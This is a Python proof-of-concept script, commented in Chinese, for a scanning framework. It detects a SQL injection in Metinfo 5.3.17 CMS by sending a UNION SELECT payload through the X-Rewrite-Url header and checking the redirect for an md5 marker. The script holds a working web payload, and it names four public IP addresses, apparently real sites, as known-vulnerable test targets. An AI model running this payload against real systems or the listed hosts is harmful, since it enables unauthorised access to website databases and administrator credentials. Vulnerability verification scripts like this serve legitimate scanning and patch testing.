from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin          # 导入其他的脚本需要用到的模块


POC_NAME = "MetinfoXRewriteurlSQLInjection"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class MetinfoXRewriteurlSQLInjection(BasePoc):

    # PoC实现类，需继承BasePoc
    # 为PoC填充poc_info、scan_info、test_case三个字典中的基本信息

    poc_info = {
        'poc': {
            'Id': 'vb_2017_0060',    # PoC的VID编号
            'vbid': '',
            'Name': 'Metinfo 5.3.17 X-Rewrite-url SQL Injection',    # PoC名称
            'Author': 'ice.liao',    # PoC作者
            'Create_date': '2017-08-15',    # PoC创建时间
            },

        'vul': {
            'Product': 'Metinfo',    # 漏洞所在产品名称
            'Version': '5.3.17',    # 产品的版本号
            'Type': 'SQL Injection',    # 漏洞类型
            'Severity': 'critical',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                MetInfo是中国长沙米拓信息技术有限公司的一套使用PHP和Mysql开发的内容管理系统（CMS）
                危害: 网站数据库信息可造成泄漏，管理员密码可被远程攻击者获得
                修复建议： 前往http://www.metinfo.cn/download/下载最新版本
            ''',    # 漏洞简要描述
            'DisclosureDate': '2017-08-11',    # PoC公布时间
        }
    }

    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': ["http://122.10.33.113/",
                 "http://122.10.28.91/",
                 "http://122.10.40.114/",
                 "http://123.57.21.100/"],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,'index.php?lang=Cn&index=1')
        payload = "1/2/zxxza' union select 1,2,3,md5(0x11),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#/index.php"
        headers = {
            "X-Rewrite-Url": payload
        }

        location = ""
        # 使用req做HTTP请求的发送和响应的处理，req是TCC框架将requests的HTTP请求方法封装成统一的req函数，使用req(url, method, **kwargs)，参数传递同requests
        resp = req(url, 'get', headers=headers, allow_redirects=False)
        if resp is not None:
            location = resp.headers.get("Location", "")

        if "47ed733b8d10be225eceba344d533586" in location:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = "X-Rewrite-Url:" + payload
            if verbose:
                highlight('[*] Metinfo 5.3.17 X-Rewrite-url SQL Injection found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息


    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)
